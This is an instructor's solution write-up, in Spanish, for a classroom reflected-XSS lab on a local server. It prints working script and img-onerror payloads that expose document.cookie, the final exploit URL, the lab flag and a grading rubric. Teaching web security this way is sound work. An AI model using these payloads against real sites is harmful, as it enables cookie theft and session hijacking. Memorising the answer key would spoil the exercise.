# Writeup (solución) — Lab 4: Reto XSS Reflejado (Estudiante)

**Ruta:** `/estudiante/reflejado/`

> ⚠️ Este documento contiene la solución. Compártelo con los estudiantes
> solo después del reto, o úsalo como guía de corrección.

## Objetivo del reto
Robar el valor de la cookie `flag` mostrándolo en un `alert()` mediante XSS
reflejado en el parámetro `q`.

## Pasos de la solución
1. Probar con un texto normal, por ejemplo `hola`, y ver que aparece en
   "Resultados para: hola". Inspeccionar el código fuente confirma que se
   inserta sin escapar.
2. Probar un payload simple:
   ```
   ?q=<script>alert(1)</script>
   ```
   Puede que no se ejecute si se navega tipeando en la barra (algunos
   navegadores tratan distinto la carga inicial vs. un link), en cuyo caso
   usar la variante con `<img>`:
   ```
   ?q=<img src=x onerror=alert(document.cookie)>
   ```
3. URL final de explotación:
   ```
   http://localhost:8080/estudiante/reflejado/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
   ```
4. Al cargar la página aparece un `alert` con el contenido de la cookie,
   incluyendo `flag=FLAG{reflected_xss_demo_2026}`.

## Criterio de evaluación sugerido
- ✅ Identifica el parámetro reflejado.
- ✅ Construye un payload funcional (script o evento HTML).
- ✅ Explica por qué funciona (falta de `htmlspecialchars`).
- ✅ Propone la corrección correcta.
